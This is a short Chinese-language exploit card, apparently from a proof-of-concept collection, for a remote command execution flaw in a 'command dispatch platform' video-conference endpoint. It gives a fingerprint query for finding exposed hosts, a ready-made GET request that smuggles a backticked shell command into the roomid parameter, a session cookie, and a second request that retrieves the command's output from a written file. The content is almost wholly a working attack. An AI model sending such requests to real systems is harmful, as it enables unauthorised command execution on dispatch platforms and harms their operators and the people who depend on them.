# 指挥调度平台invite2videoconf存在远程命令执行漏洞

- **系统**：指挥调度平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`GET /api/client/invite2videoconf.php?callee=1&roomid=`id>1.txt` HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2`

**请求体 / payload**
```

获取命令执行结果
GET /api/client/1.txt HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
```

**其他**
- 指挥调度平台invite2videoconf存在远程命令执行漏洞: * 一、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***